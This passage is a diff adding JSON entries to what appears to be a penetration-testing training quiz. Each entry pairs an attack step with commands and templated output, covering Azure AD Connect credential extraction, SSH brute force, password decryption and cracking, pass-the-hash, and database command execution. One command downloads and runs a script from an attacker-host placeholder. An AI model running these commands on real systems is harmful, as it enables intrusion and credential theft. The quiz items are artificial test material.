+            "d": "Run Get-MSOLCredentials.ps1 in elevated PowerShell session.",
+            "demo": [
+              {
+                "run": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/Get-MSOLCredentials.ps1')\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "MSOL password recovered."
+          }
+        ]
+      },
+      "situation": "Scenario: Extract Azure AD Connect synchronization account credentials. Which move should you run next?",
+      "choices": [
+        "azuread-connect-dump",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Azure AD Connect Database Credential Extraction.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Azure AD Connect Database Credential Extraction.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Azure AD Connect Database Credential Extraction."
+      }
+    },
+    "crack-hash-troubleshoot": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once \"Token length exception\" almost always means the wrong -m. The key confirmation is: hashcat accepts the hash once the mode matches.",
+      "cmd": "hashid -m '{{hash}}'   # or: nth --text '{{hash}}'",
+      "tool": "hashid",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "hashcat accepts the hash once the mode matches.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Hashcat/John Won't Load the Hash - Fix It, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Re-identify the hash (Workbench Hash ID, or hashid -m) and use the exact mode.",
+            "demo": [
+              {
+                "run": "hashid -m '{{hash}}'   # or: nth --text '{{hash}}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "hashcat accepts the hash once the mode matches."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Match the user prefix to the mode: NetNTLMv2 and Kerberos modes WANT user$realm in the line, raw MD5 and NTLM modes do NOT. Strip or keep the user: prefix to match.",
+            "demo": [
+              {
+                "run": "hashcat -m {{mode}} hash.txt {{wordlist}}   # strip/keep the user: prefix to match the mode",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "hashcat starts cracking instead of reporting no hashes."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Pick the matching --format (john --list=formats | grep your type). \"No password hashes loaded\" means the format is wrong or the file is malformed.",
+            "demo": [
+              {
+                "run": "john --list=formats | grep -i {{type}}; john --format={{fmt}} hash.txt --wordlist={{wordlist}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "john loads the hash and begins."
+          }
+        ]
+      },
+      "situation": "Scenario: \"Token length exception\" almost always means the wrong -m. Which move should you run next?",
+      "choices": [
+        "crack-hash-troubleshoot",
+        "crack-kerberoast",
+        "crack-identify",
+        "crack-asrep-offline"
+      ],
+      "coach": {
+        "crack-kerberoast": "Crack a Kerberoast (TGS) Hash targets the plaintext password recovered from a kerberoast hash (a candidate credential); here the direct move is Hashcat/John Won't Load the Hash - Fix It.",
+        "crack-identify": "Identify an Unknown Hash targets the likely hash type and cracker mode to use (hashcat --identify records hash.type{mode}); here the direct move is Hashcat/John Won't Load the Hash - Fix It.",
+        "crack-asrep-offline": "Crack an AS-REP Roast Hash targets the plaintext recovered from an as-rep hash (a candidate credential); here the direct move is Hashcat/John Won't Load the Hash - Fix It."
+      }
+    },
+    "blind-brute-ssh": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: returns a common-account login.",
+      "cmd": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://10.10.10.10",
+      "tool": "hydra",
+      "output": "[DATA] attacking ssh://10.10.10.10:22/\n[22][ssh] host: 10.10.10.10   login: admin   password: admin\n1 of 1 target successfully completed, 1 valid password found",
+      "signal": "[22][ssh] host: 10.10.10.10   login: admin   password: admin",
+      "teach": "With no username list, a blind brute leans on common accounts and default passwords. If it lands, you got lucky on a weak default; stop and pivot. If it does not, you have lost little, this was always the move of last resort.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Blind SSH Brute (Common Users, Last Resort), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "This uses a SHORT common-users wordlist (root, admin, service names), not an enumerated one, so it works precisely when you have no user list. If a login lands, stop and pivot.",
+            "demo": [
+              {
+                "run": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://{{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "hydra returns a common-account login."
+          },
+          {
+            "t": "Verify the result and capture proof",
+            "d": "Confirm that the output proves the hypothesis before chaining the next move.",
+            "demo": [
+              {
+                "run": "id; hostname",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Does not prove: anything until hydra actually returns a hit; a clean run just means common creds did not work"
+          }
+        ]
+      },
+      "situation": "Scenario: The true last resort: SSH is open, you have NO enumerated user list, and nothing else is panning out. It sits at the bottom of the list on purpose. Which move should you run next?",
+      "choices": [
+        "blind-brute-ssh",
+        "crack-hash-troubleshoot",
+        "crack-kerberoast",
+        "crack-identify"
+      ],
+      "coach": {
+        "crack-hash-troubleshoot": "Hashcat/John Won't Load the Hash - Fix It targets nothing attack-wise; it gets the cracker to actually load and run on your hash; here the direct move is Blind SSH Brute (Common Users, Last Resort).",
+        "crack-kerberoast": "Crack a Kerberoast (TGS) Hash targets the plaintext password recovered from a kerberoast hash (a candidate credential); here the direct move is Blind SSH Brute (Common Users, Last Resort).",
+        "crack-identify": "Identify an Unknown Hash targets the likely hash type and cracker mode to use (hashcat --identify records hash.type{mode}); here the direct move is Blind SSH Brute (Common Users, Last Resort)."
+      }
+    },
+    "vnc-decrypt": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once decrypt obfuscated VNC passwords using vncpwd. The key confirmation is: VNC password decrypted.",
+      "cmd": "vncpwd {{vnc_hex_or_file}}",
+      "tool": "vncpwd",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "VNC password decrypted.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute VNC Stored Password Decryption, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run vncpwd against extracted VNC passwd or registry file.",
+            "demo": [
+              {
+                "run": "vncpwd {{vnc_hex_or_file}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "VNC password decrypted."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run python script decrypting 8-byte hex string.",
+            "demo": [
+              {
+                "run": "python3 vncpasswd.py -d {{vnc_hex}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "VNC connection password recovered."
+          }
+        ]
+      },
+      "situation": "Scenario: Decrypt obfuscated VNC passwords using vncpwd. Which move should you run next?",
+      "choices": [
+        "vnc-decrypt",
+        "crack-hash-troubleshoot",
+        "crack-kerberoast",
+        "crack-identify"
+      ],
+      "coach": {
+        "crack-hash-troubleshoot": "Hashcat/John Won't Load the Hash - Fix It targets nothing attack-wise; it gets the cracker to actually load and run on your hash; here the direct move is VNC Stored Password Decryption.",
+        "crack-kerberoast": "Crack a Kerberoast (TGS) Hash targets the plaintext password recovered from a kerberoast hash (a candidate credential); here the direct move is VNC Stored Password Decryption.",
+        "crack-identify": "Identify an Unknown Hash targets the likely hash type and cracker mode to use (hashcat --identify records hash.type{mode}); here the direct move is VNC Stored Password Decryption."
+      }
+    },
+    "keepass-dump-recover": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once reconstruct KeePass master password from a process memory dump. The key confirmation is: Cleartext KeePass master password printed.",
+      "cmd": "python3 keepass_dump_masterkey.py -d {{dump_file|keepass.dmp}}",
+      "tool": "python3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Cleartext KeePass master password printed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute KeePass Memory Dump Recovery (CVE-2023-32784) & Hash Cracking, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run keepass_dump_masterkey.py against the extracted KeePass.dmp file.",
+            "demo": [
+              {
+                "run": "python3 keepass_dump_masterkey.py -d {{dump_file|keepass.dmp}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Cleartext KeePass master password printed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Use keepass2john to extract the $keepass$ format hash from the .kdbx file.",
+            "demo": [
+              {
+                "run": "keepass2john {{kdbx_file}} > {{kdbx_file}}.hash && john --wordlist={{wordlist}} {{kdbx_file}}.hash",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Master password cracked for the KDBX database."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Use pykeepass with the validated master password to iterate through all entries.",
+            "demo": [
+              {
+                "run": "python3 -c \"import pykeepass; kp = pykeepass.PyKeePass('{{kdbx_file}}', password='{{password}}'); [print(e.title, e.username, e.password) for e in kp.entries]\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Complete inventory of decrypted KeePass vault credentials."
+          }
+        ]
+      },
+      "situation": "Scenario: Reconstruct KeePass master password from a process memory dump. Which move should you run next?",
+      "choices": [
+        "keepass-dump-recover",
+        "crack-hash-troubleshoot",
+        "crack-kerberoast",
+        "crack-identify"
+      ],
+      "coach": {
+        "crack-hash-troubleshoot": "Hashcat/John Won't Load the Hash - Fix It targets nothing attack-wise; it gets the cracker to actually load and run on your hash; here the direct move is KeePass Memory Dump Recovery (CVE-2023-32784) & Hash Cracking.",
+        "crack-kerberoast": "Crack a Kerberoast (TGS) Hash targets the plaintext password recovered from a kerberoast hash (a candidate credential); here the direct move is KeePass Memory Dump Recovery (CVE-2023-32784) & Hash Cracking.",
+        "crack-identify": "Identify an Unknown Hash targets the likely hash type and cracker mode to use (hashcat --identify records hash.type{mode}); here the direct move is KeePass Memory Dump Recovery (CVE-2023-32784) & Hash Cracking."
+      }
+    },
+    "cisco-decrypt": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once reversibly decrypt Cisco Type 7 password from configuration file. The key confirmation is: Cisco administrative cleartext password recovered.",
+      "cmd": "cisco-decrypt {{ciphertext}}",
+      "tool": "cisco-decrypt",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Cisco administrative cleartext password recovered.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Cisco Password Decryption and Hash Cracking, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Pass the hexadecimal ciphertext from the 'password 7 <cipher>' config line to cisco-decrypt.",
+            "demo": [
+              {
+                "run": "cisco-decrypt {{ciphertext}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Cisco administrative cleartext password recovered."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Extract the '$1$...' hash from 'enable secret 5' or 'username <user> secret 5'.",
+            "demo": [
+              {
+                "run": "hashcat -m 500 {{hashes_file}} /usr/share/wordlists/rockyou.txt",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Cisco enable or administrative user secret successfully cracked."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Save the secret hash to a file and run john with --format=md5crypt-long.",
+            "demo": [
+              {
+                "run": "john --format=md5crypt-long {{hashes_file}} --wordlist=/usr/share/wordlists/rockyou.txt",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Cleartext password recovered by John the Ripper."
+          }
+        ]
+      },
+      "situation": "Scenario: Reversibly decrypt Cisco Type 7 password from configuration file. Which move should you run next?",
+      "choices": [
+        "cisco-decrypt",
+        "crack-hash-troubleshoot",
+        "crack-kerberoast",
+        "crack-identify"
+      ],
+      "coach": {
+        "crack-hash-troubleshoot": "Hashcat/John Won't Load the Hash - Fix It targets nothing attack-wise; it gets the cracker to actually load and run on your hash; here the direct move is Cisco Password Decryption and Hash Cracking.",
+        "crack-kerberoast": "Crack a Kerberoast (TGS) Hash targets the plaintext password recovered from a kerberoast hash (a candidate credential); here the direct move is Cisco Password Decryption and Hash Cracking.",
+        "crack-identify": "Identify an Unknown Hash targets the likely hash type and cracker mode to use (hashcat --identify records hash.type{mode}); here the direct move is Cisco Password Decryption and Hash Cracking."
+      }
+    },
+    "validate-credential": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you hold recovered credential material that has not been validated on this target and service, including an offline-cracked password. The key confirmation is: You know the credential authenticates before you spend a single move on it.",
+      "cmd": "nxc smb {{target}} -u {{user}} -p '{{password}}'",
+      "tool": "nxc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "You know the credential authenticates before you spend a single move on it.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Validate A Found Credential, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run the switchless nxc check: proto, target, user, secret, nothing else.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u {{user}} -p '{{password}}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You know the credential authenticates before you spend a single move on it."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Same check with -H instead of -p: pass-the-hash to prove the hash authenticates.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u {{user}} -H {{nthash}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The found hash is confirmed usable for pass-the-hash."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Repeat over ldap, the bind you need for BloodHound collection and directory reads.",
+            "demo": [
+              {
+                "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You know the credential opens LDAP, not just SMB."
+          }
+        ]
+      },
+      "situation": "Scenario: You hold recovered credential material that has not been validated on this target and service, including an offline-cracked password. Which move should you run next?",
+      "choices": [
+        "validate-credential",
+        "crack-hash-troubleshoot",
+        "crack-kerberoast",
+        "crack-identify"
+      ],
+      "coach": {
+        "crack-hash-troubleshoot": "Hashcat/John Won't Load the Hash - Fix It targets nothing attack-wise; it gets the cracker to actually load and run on your hash; here the direct move is Validate A Found Credential.",
+        "crack-kerberoast": "Crack a Kerberoast (TGS) Hash targets the plaintext password recovered from a kerberoast hash (a candidate credential); here the direct move is Validate A Found Credential.",
+        "crack-identify": "Identify an Unknown Hash targets the likely hash type and cracker mode to use (hashcat --identify records hash.type{mode}); here the direct move is Validate A Found Credential."
+      }
+    },
+    "postgres-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you are a superuser (or have the right role) on PostgreSQL 9.3+. The key confirmation is: A command runs via COPY TO PROGRAM.",
+      "cmd": "psql -h {{target}} -U {{user}} -c \"COPY (SELECT '') TO PROGRAM 'id'\"",
+      "tool": "psql",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "A command runs via COPY TO PROGRAM.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute PostgreSQL to Command Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "COPY ... TO PROGRAM runs a shell command. A one-liner RCE for superusers. Build the payload in the Workbench.",
+            "demo": [
+              {
+                "run": "psql -h {{target}} -U {{user}} -c \"COPY (SELECT '') TO PROGRAM 'id'\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A command runs via COPY TO PROGRAM."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "COPY FROM PROGRAM into a table, then SELECT it to read the output.",
+            "demo": [
+              {
+                "run": "psql -h {{target}} -U {{user}} -c \"DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You read command output through the table."
+          }
+        ]
+      },
+      "situation": "Scenario: You are a superuser (or have the right role) on PostgreSQL 9.3+. Which move should you run next?",
+      "choices": [
+        "postgres-rce",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is PostgreSQL to Command Execution.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is PostgreSQL to Command Execution.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is PostgreSQL to Command Execution."
+      }
+    },
+    "oracle-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once with Oracle creds, get command execution. The key confirmation is: A command runs through Oracle.",
+      "cmd": "odat externaltable -s {{target}} -d {{sid}} -U {{user}} -P {{password}} --getecho --command \"id\"",
+      "tool": "odat",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "A command runs through Oracle.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Oracle to Command Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "odat externaltable runs a command via an external table.",
+            "demo": [
+              {
+                "run": "odat externaltable -s {{target}} -d {{sid}} -U {{user}} -P {{password}} --getecho --command \"id\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A command runs through Oracle."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "odat all enumerates every exploitation path.",
+            "demo": [
+              {
+                "run": "odat all -s {{target}} -d {{sid}} -U {{user}} -P {{password}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "odat finds a working RCE path."
+          }
+        ]
+      },
+      "situation": "Scenario: With Oracle creds, get command execution. Which move should you run next?",
+      "choices": [
+        "oracle-rce",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is Oracle to Command Execution.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is Oracle to Command Execution.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is Oracle to Command Execution."
+      }
+    },
+    "elasticsearch-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once confirm the version supports the Groovy sandbox escape. The key confirmation is: The version is confirmed vulnerable.",
+      "cmd": "curl -s http://{{target}}:9200/",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The version is confirmed vulnerable.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Elasticsearch to Command Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "curl the root. Old ES (1.x) has the CVE-2015-1427 Groovy RCE.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}:9200/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The version is confirmed vulnerable."
+          },
+          {
